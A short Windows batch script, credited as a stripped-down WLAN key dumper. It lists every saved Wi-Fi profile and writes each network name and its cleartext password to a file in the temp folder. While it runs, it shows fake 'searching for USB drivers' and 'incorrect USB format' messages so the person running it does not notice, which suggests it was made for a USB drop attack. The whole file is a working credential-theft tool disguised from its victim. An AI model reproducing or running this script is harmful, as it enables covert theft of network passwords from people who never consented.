@echo off
rem "a stripped down version of the wlan key dumper written by: Aditya K Sood  (adi_ks [at] secniche.org)."

echo Unknown USB type detected. Searching for drivers...

netsh wlan show profiles * | findstr /l :"SSID name" > %TMP%\ssids.txt
del %TMP%\ssidswkeys.txt > nul 2> nul

for /F "tokens=4*" %%i in (%TMP%\ssids.txt) do (
	echo ssid: %%i %%j >> %TMP%\ssidswkeys.txt 
	netsh wlan show profile name=%%i %%j key=clear | findstr /l :"Key Content"   >> %TMP%\ssidswkeys.txt 
        echo( >> %TMP%\ssidswkeys.txt 
)
del %TMP%\ssids.txt

echo Incorrect USB format. Please remove.
pause